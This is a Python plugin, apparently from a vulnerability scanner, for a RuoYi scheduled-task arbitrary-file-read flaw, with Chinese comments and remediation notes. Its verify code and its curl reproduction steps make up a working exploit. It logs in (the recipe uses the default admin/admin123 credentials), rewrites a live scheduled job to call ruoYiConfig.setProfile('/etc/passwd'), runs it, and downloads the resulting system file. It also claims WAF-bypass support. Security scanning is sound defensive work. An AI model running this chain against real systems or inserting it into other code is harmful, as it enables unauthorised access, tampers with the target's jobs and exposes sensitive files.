# 定时任务任意文件读取：登录链 → edit→run 触发 ruoYiConfig.setProfile，再读取落地文件 2.txt
# D1 改造（2026-07-18）：删除硬编码 JSESSIONID + 固定 Content-Length，改用 RuoYiAuthChain 登录拿会话
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from core.auth_chain import RuoYiAuthChain, LOGIN_OK, LOGIN_CAPTCHA
from lib.colors import ok, no
from lib.http import join_url
from lib.matcher import match_all
from config import settings


class FileReadTimePlugin(PluginBase):
    name = '定时任务任意文件读取'
    cve = 'N/A'
    severity = 'high'
    category = 'vuln'
    description = (
        '通过定时任务 edit 修改 invokeTarget 为 ruoYiConfig.setProfile(/etc/passwd)，'
        'run 后读取落地文件 2.txt。需后台鉴权，D1 起改用登录链获取会话'
    )
    fix = '限制定时任务 invokeTarget 参数，禁止调用任意方法；后台强制鉴权'
    fix_detail = (
        '【升级方案】升级 RuoYi 至 4.7.0+（该版本对 invokeTarget 做了白名单校验，禁止调用 ruoYiConfig）\n'
        '【代码修复】SysJobController.edit() 添加 invokeTarget 白名单：\n'
        '  String[] allowedTargets = {"ryTask.ryParams","ryTask.ryMultipleParams"};\n'
        '  if (!Arrays.asList(allowedTargets).contains(invokeTarget.split("\\(")[0])) throw new ServiceException("非法调用目标");\n'
        '【权限加固】为 /monitor/job/edit 强制鉴权：@PreAuthorize("@ss.hasPermi(\'monitor:job:edit\')")\n'
        '【WAF 规则】拦截 invokeTarget 参数含 ruoYiConfig/java.lang.Runtime 的 /monitor/job/edit 请求\n'
        '【审计】记录所有 /monitor/job/edit 操作日志，定期审计\n'
        '【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制'
    )
    reproduce = (
        '# 1. 先用默认口令登录获取 token（admin/admin123）：\n'
        'TOKEN=$(curl -s -X POST "http://target/login" -H "Content-Type: application/json" \\\n'
        '  -d \'{"username":"admin","password":"admin123"}\' | grep -oP \'(?<="token":")[^"]+\')\n'
        '\n'
        '# 2. 修改定时任务 invokeTarget 为 ruoYiConfig.setProfile：\n'
        'curl -X POST "http://target/monitor/job/edit" \\\n'
        '  -H "Authorization: Bearer $TOKEN" \\\n'
        '  -d "jobId=2&jobName=test&invokeTarget=ruoYiConfig.setProfile(\'/etc/passwd\')&cronExpression=0/5+*+*+*+*+?"\n'
        '\n'
        '# 3. 触发任务执行：\n'
        'curl -X PUT "http://target/monitor/job/run" -H "Authorization: Bearer $TOKEN" -d "jobId=2"\n'
        '\n'
        '# 4. 读取落地文件 2.txt：\n'
        'curl "http://target/2.txt"\n'
        '  # 预期响应：响应体含 /etc/passwd 内容'
    )
    # D2：/monitor/job/edit 白名单在 4.7.0 收紧，setProfile 调用被禁
    affected_versions = '>=4.0,<4.7'
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = 'AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N'
    compliance = '等保2.0:8.1.4;OWASP:A01:2021'
    # D7: WAF 绕过支持
    vuln_type = 'file_read'
    supports_waf_bypass = True

    def verify(self, target, session):
        # D1 登录链：先登录拿会话，再走 edit → run → read 流程
        auth = RuoYiAuthChain(
            target, session,
            username=settings.RuoYiAuth.USERNAME,
            password=settings.RuoYiAuth.PASSWORD,
            remember_me=settings.RuoYiAuth.REMEMBER_ME,
            timeout=settings.RuoYiAuth.TIMEOUT,
        )
        ok_login, reason = auth.login()
        if not ok_login:
            if reason == LOGIN_CAPTCHA:
                print(no('定时任务任意文件读取（需验证码且 OCR 失败）'))
                return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                                  evidence=f'登录链验证码 OCR 失败：{reason}')
            print(no(f'定时任务任意文件读取（登录失败：{reason}）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              evidence=f'登录链失败：{reason}')

        # 登录成功，session 已带 Cookie（v4）或 Authorization（v5）
        # Step 1：编辑定时任务（写入 invokeTarget）
        # D1 修复：删除固定 Content-Length（让 requests 自动计算），避免原脚本老 bug
        data1 = {
            "jobId": "4", "updateBy": "admin", "jobName": "beb528e3", "jobGroup": "DEFAULT",
            "invokeTarget": "ruoYiConfig.setProfile('/etc/passwd')",
            "cronExpression": "0/10 * * * * ?",
            "misfirePolicy": "1", "concurrent": "1", "status": "1", "remark": ""
        }
        try:
            session.post(join_url(target, '/monitor/job/edit'), data=data1)
        except Exception as e:
            print(no('定时任务任意文件读取（edit 异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN, evidence=str(e))

        # Step 2：运行定时任务
        try:
            session.post(join_url(target, '/monitor/job/run'), data={'jobId': '4'})
        except Exception as e:
            print(no('定时任务任意文件读取（run 异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN, evidence=str(e))

        # Step 3：读取落地文件 2.txt
        url2 = join_url(target, '/common/download/resource?resource=2.txt')
        try:
            file_install = session.get(url2).text
        except Exception as e:
            print(no('定时任务任意文件读取（读取 2.txt 异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN, evidence=str(e))

        # 判定：'root' 与 ':/' 同时出现（使用 match_all 统一判定）
        if match_all(file_install, ['root', ':/']):
            print(ok('存在定时任务任意文件读取漏洞'))
            return ScanResult(kind='vuln', name=self.name, severity=self.severity,
                              status=STATUS_CONFIRMED, url=url2,
                              evidence='响应含 root 与 :/ 特征（落地文件 2.txt，登录链成功）',
                              fix=self.fix)
        else:
            print(no('不存在定时任务任意文件读取漏洞'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url2)
